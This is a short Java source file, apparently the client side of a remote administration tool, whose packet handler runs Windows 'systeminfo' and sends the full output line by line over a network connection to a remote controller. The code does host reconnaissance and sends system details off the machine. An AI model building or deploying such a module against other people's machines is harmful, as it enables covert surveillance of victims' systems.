package com.redpois0n.packets;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import com.redpois0n.Connection;
import com.redpois0n.common.OperatingSystem;


public class PacketSYSINFO extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			Process p = Runtime.getRuntime().exec("systeminfo");
			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

			Connection.writeLine("RAWINFO");

			while ((line = reader.readLine()) != null) {
				Connection.writeLine(line.trim());
			}

			Connection.writeLine("END");
		}
	}

}
